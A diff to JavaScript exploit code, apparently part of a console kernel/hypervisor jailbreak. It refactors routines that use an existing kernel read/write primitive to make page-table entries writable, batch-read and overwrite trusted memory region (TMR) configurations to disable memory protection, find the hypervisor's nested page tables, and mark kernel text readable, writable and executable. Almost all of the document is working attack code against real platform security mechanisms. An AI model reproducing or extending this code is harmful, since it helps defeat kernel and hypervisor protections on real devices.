@@ -76,11 +76,13 @@ async function uartLog(p, chain, msg) {
 // The DMAP page covering PA 0xF00C2xxx is mapped read-only — we patch the
 // PDE to add write access before TMR operations, then restore it.
 // ---------------------------------------------------------------------------
-async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i, log) {
+async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i) {
     var pa = TMR_INDIRECT_ADDR;
     var pdptIdx = (pa >>> 30) & 0x1FF;
     var pdIdx = (pa >>> 21) & 0x1FF;
 
+    // Batch: read PML4E + PDPTE in one run, but PDPTE addr depends on PML4E value
+    // so we must do two separate reads
     var pml4e = await krw.read8(guestPml4VA.add32(dmpml4i * 8));
     if (!(pml4e.low & PTE_PRESENT)) throw new Error("DMAP PML4E not present");
 
@@ -88,14 +90,10 @@ async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i, log) {
     var pdpte = await krw.read8(pdptBase.add32(pdptIdx * 8));
     if (!(pdpte.low & PTE_PRESENT)) throw new Error("DMAP PDPTE not present for TMR");
 
-    log("PDPTE[" + pdptIdx + "]=0x" + pdpte.toString(16) + (pdpte.low & PTE_PS ? " 1G" : " 2M") + (pdpte.low & PTE_WRITE ? " W" : " RO"), LogLevel.LOG);
-
     if (pdpte.low & PTE_PS) {
         if (!(pdpte.low & PTE_WRITE)) {
             var entryAddr = pdptBase.add32(pdptIdx * 8);
-            var patched = new int64((pdpte.low | PTE_WRITE) >>> 0, pdpte.hi);
-            await krw.write8(entryAddr, patched);
-            log("Patched 1G PDPTE for write", LogLevel.LOG);
+            await krw.write8(entryAddr, new int64((pdpte.low | PTE_WRITE) >>> 0, pdpte.hi));
             return { addr: entryAddr, orig: pdpte };
         }
         return null;
@@ -105,83 +103,104 @@ async function ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i, log) {
     var pde = await krw.read8(pdBase.add32(pdIdx * 8));
     if (!(pde.low & PTE_PRESENT)) throw new Error("DMAP PDE not present for TMR");
 
-    log("PDE[" + pdIdx + "]=0x" + pde.toString(16) + (pde.low & PTE_WRITE ? " W" : " RO"), LogLevel.LOG);
-
     if (!(pde.low & PTE_WRITE)) {
         var entryAddr = pdBase.add32(pdIdx * 8);
-        var patched = new int64((pde.low | PTE_WRITE) >>> 0, pde.hi);
-        await krw.write8(entryAddr, patched);
-        log("Patched 2M PDE for write", LogLevel.LOG);
+        await krw.write8(entryAddr, new int64((pde.low | PTE_WRITE) >>> 0, pde.hi));
         return { addr: entryAddr, orig: pde };
     }
     return null;
 }
 
-async function tmrReadReg(krw, dmap, off) {
-    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
-    return await krw.read4(dmap.add32(TMR_INDIRECT_DATA));
-}
-
-async function tmrWriteReg(krw, dmap, off, val) {
-    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
-    await krw.write4(dmap.add32(TMR_INDIRECT_DATA), val);
-}
-
 // ---------------------------------------------------------------------------
-// TMR defeat — scan all 22 entries, relax any covering the target PA
-// Matches reference tmr_relax_for_pa() approach
+// TMR defeat — batched: read ALL entries in one chain.run(), write matches in another
 // ---------------------------------------------------------------------------
-async function tmrRelaxForPA(krw, dmap, pa, log) {
-    var pa16 = (pa.hi << 16) | (pa.low >>> 16);
-    var count = 0;
-
-    log("TMR scan pa16=0x" + (pa16 >>> 0).toString(16), LogLevel.LOG);
-
-    for (var i = TMR_MAX - 1; i >= 0; i--) {
-        if (i === 19 || i === 20) continue;
-
-        log("TMR[" + i + "] read...", LogLevel.LOG);
-        var b = await tmrReadReg(krw, dmap, i * 0x10 + 0x00);
-        var l = await tmrReadReg(krw, dmap, i * 0x10 + 0x04);
-        var c = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
-        log("TMR[" + i + "] b=0x" + (b >>> 0).toString(16) + " l=0x" + (l >>> 0).toString(16) + " c=0x" + (c >>> 0).toString(16), LogLevel.LOG);
-
-        if ((c & 1) === 0) continue;
-        if ((pa16 >>> 0) < (b >>> 0) || (pa16 >>> 0) > (l >>> 0)) continue;
-
-        log("TMR[" + i + "] covers PA, writing permissive...", LogLevel.LOG);
-        await tmrWriteReg(krw, dmap, i * 0x10 + 0x08, TMR_CFG_PERMISSIVE);
-        var nc = await tmrReadReg(krw, dmap, i * 0x10 + 0x08);
-        var ok = (nc === TMR_CFG_PERMISSIVE);
-
-        log("TMR[" + i + "] 0x" + c.toString(16) + " -> 0x" + nc.toString(16) + (ok ? " OK" : " FAIL"), ok ? LogLevel.INFO : LogLevel.ERROR);
-        if (!ok) throw new Error("TMR[" + i + "] defeat failed");
-        count++;
-    }
-    return count;
-}
-
 async function tmrDefeat(krw, dmap, log) {
     var fw = window.fw_float;
+    var indexVA = dmap.add32(TMR_INDIRECT_ADDR);
+    var dataVA = dmap.add32(TMR_INDIRECT_DATA);
 
-    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
-    if (tmr16Base === 0) throw new Error("TMR[16].base = 0 — can't find kernel PA");
-    var kernelPA = i64shl16(tmr16Base);
+    // Phase 1: read all TMR entries in ONE batch
+    krw.batchReset();
+    var slots = [];
+    for (var i = TMR_MAX - 1; i >= 0; i--) {
+        if (i === 19 || i === 20) continue;
+        krw.batchPushWrite4(indexVA, i * 0x10 + 0x00);
+        var bi = krw.batchPushRead4(dataVA);
+        krw.batchPushWrite4(indexVA, i * 0x10 + 0x04);
+        var li = krw.batchPushRead4(dataVA);
+        krw.batchPushWrite4(indexVA, i * 0x10 + 0x08);
+        var ci = krw.batchPushRead4(dataVA);
+        slots.push({ i: i, bi: bi, li: li, ci: ci });
+    }
+    await krw.batchFlush();
 
+    var entries = slots.map(function(s) {
+        return { i: s.i, b: krw.batchGet4(s.bi), l: krw.batchGet4(s.li), c: krw.batchGet4(s.ci) };
+    });
+
+    // Get kernel PA from TMR[16]
+    var tmr16 = entries.find(function(e) { return e.i === 16; });
+    if (!tmr16 || tmr16.b === 0) throw new Error("TMR[16].base = 0");
+    var kernelPA = i64shl16(tmr16.b);
     log("Kernel PA=0x" + kernelPA.toString(16), LogLevel.LOG);
 
-    var n = await tmrRelaxForPA(krw, dmap, kernelPA, log);
-    log("Relaxed " + n + " TMR(s) for kernel PA", LogLevel.INFO);
-
+    var hvPA = null;
     if (fw >= 3.00) {
-        var tmr17Base = await tmrReadReg(krw, dmap, 17 * 0x10);
-        if (tmr17Base !== 0) {
-            var hvPA = i64shl16(tmr17Base);
+        var tmr17 = entries.find(function(e) { return e.i === 17; });
+        if (tmr17 && tmr17.b !== 0) {
+            hvPA = i64shl16(tmr17.b);
             log("HV PA=0x" + hvPA.toString(16) + " (TMR17)", LogLevel.LOG);
-            var n2 = await tmrRelaxForPA(krw, dmap, hvPA, log);
-            log("Relaxed " + n2 + " TMR(s) for HV PA", LogLevel.INFO);
         }
     }
+
+    // Phase 2: find entries covering kernel PA (and HV PA), write permissive in one batch
+    var kpa16 = ((kernelPA.hi << 16) | (kernelPA.low >>> 16)) >>> 0;
+    var hpa16 = hvPA ? (((hvPA.hi << 16) | (hvPA.low >>> 16)) >>> 0) : 0;
+    var toRelax = [];
+
+    for (var j = 0; j < entries.length; j++) {
+        var e = entries[j];
+        if ((e.c & 1) === 0) continue;
+        var covers_k = (kpa16 >= (e.b >>> 0) && kpa16 <= (e.l >>> 0));
+        var covers_h = hvPA && (hpa16 >= (e.b >>> 0) && hpa16 <= (e.l >>> 0));
+        if (covers_k || covers_h) {
+            toRelax.push(e.i);
+        }
+    }
+
+    if (toRelax.length === 0) {
+        log("No active TMR entries cover target PA", LogLevel.INFO);
+        return;
+    }
+
+    krw.batchReset();
+    for (var k = 0; k < toRelax.length; k++) {
+        var idx = toRelax[k];
+        krw.batchPushWrite4(indexVA, idx * 0x10 + 0x08);
+        krw.batchPushWrite4(dataVA, TMR_CFG_PERMISSIVE);
+    }
+    await krw.batchFlush();
+
+    // Phase 3: verify writes in one batch
+    krw.batchReset();
+    var verifySlots = [];
+    for (var m = 0; m < toRelax.length; m++) {
+        krw.batchPushWrite4(indexVA, toRelax[m] * 0x10 + 0x08);
+        verifySlots.push(krw.batchPushRead4(dataVA));
+    }
+    await krw.batchFlush();
+
+    var count = 0;
+    for (var n = 0; n < toRelax.length; n++) {
+        var nc = krw.batchGet4(verifySlots[n]);
+        var ok = (nc === TMR_CFG_PERMISSIVE);
+        log("TMR[" + toRelax[n] + "] -> 0x" + nc.toString(16) + (ok ? " OK" : " FAIL"), ok ? LogLevel.INFO : LogLevel.ERROR);
+        if (!ok) throw new Error("TMR[" + toRelax[n] + "] defeat failed");
+        count++;
+    }
+
+    log("Relaxed " + count + " TMR(s)", LogLevel.INFO);
+    return { kernelPA: kernelPA, hvPA: hvPA };
 }
 
 // ---------------------------------------------------------------------------
@@ -193,7 +212,7 @@ function vmcbPAForCore(fw, core) {
     return null;
 }
 
-async function discoverNpt(krw, dmap, log) {
+async function discoverNpt(krw, dmap, kernelPA, hvPA, log) {
     var fw = window.fw_float;
 
     // FW 3.00+: hardcoded VMCB PAs from reference implementation
@@ -209,13 +228,9 @@ async function discoverNpt(krw, dmap, log) {
     }
 
     // Fallback: scan HV data area for VMCB nCR3 signature
-    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 0x10);
-    var kernelPA = i64shl16(tmr16Base);
-
     var hvDataPA;
-    if (fw >= 3.00) {
-        var tmr17Base = await tmrReadReg(krw, dmap, 17 * 0x10);
-        hvDataPA = tmr17Base ? i64shl16(tmr17Base) : i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
+    if (hvPA) {
+        hvDataPA = hvPA;
     } else {
         hvDataPA = i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));
     }
@@ -376,33 +391,30 @@ async function disableTmrAndXot(krw, chain, log, p) {
     var guestPml4VA = await krw.read8(pmapAddr.add32(OFFSET_KERNEL_PMAP_PM_PML4));
     if (guestPml4VA.low === 0 && guestPml4VA.hi === 0) throw new Error("Guest PML4 VA is 0");
 
-    var tmrPatch = await ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i, dlog);
+    var tmrPatch = await ensureTmrWritable(krw, dmap, guestPml4VA, dmpml4i);
     if (tmrPatch) {
-        await dlog("PDE patched, flushing TLB", LogLevel.LOG);
+        log("PDE patched for TMR write access", LogLevel.LOG);
         await chain.syscall(SYS_SCHED_YIELD);
-    } else {
-        await dlog("TMR DMAP page already writable", LogLevel.LOG);
     }
 
-    var testVal = await tmrReadReg(krw, dmap, 0x00);
-    await dlog("TMR test read: TMR[0].base=0x" + (testVal >>> 0).toString(16), LogLevel.LOG);
-
-    await tmrDefeat(krw, dmap, dlog);
+    var tmrResult = await tmrDefeat(krw, dmap, log);
 
     if (tmrPatch) {
         await krw.write8(tmrPatch.addr, tmrPatch.orig);
         await chain.syscall(SYS_SCHED_YIELD);
     }
 
-    var ncr3 = await discoverNpt(krw, dmap, dlog);
+    await dlog("TMR defeat done", LogLevel.INFO);
 
-    await dlog("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);
+    var ncr3 = await discoverNpt(krw, dmap, tmrResult.kernelPA, tmrResult.hvPA, log);
+
+    log("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);
 
     var rangeSize = OFFSET_KERNEL_DATA + 0x7000000;
-    await dlog("Setting RWX: 0x" + krw.ktextBase.toString(16) + " +0x" + rangeSize.toString(16), LogLevel.INFO);
+    log("Setting RWX: 0x" + krw.ktextBase.toString(16) + " +0x" + rangeSize.toString(16), LogLevel.INFO);
 
-    var count = await patchPageTables(krw, dmap, guestPml4VA, ncr3, krw.ktextBase, rangeSize, dlog);
-    await dlog("Patched " + count + " pages", LogLevel.INFO);
+    var count = await patchPageTables(krw, dmap, guestPml4VA, ncr3, krw.ktextBase, rangeSize, log);
+    log("Patched " + count + " pages", LogLevel.INFO);
 
     await chain.syscall(SYS_SCHED_YIELD);
 
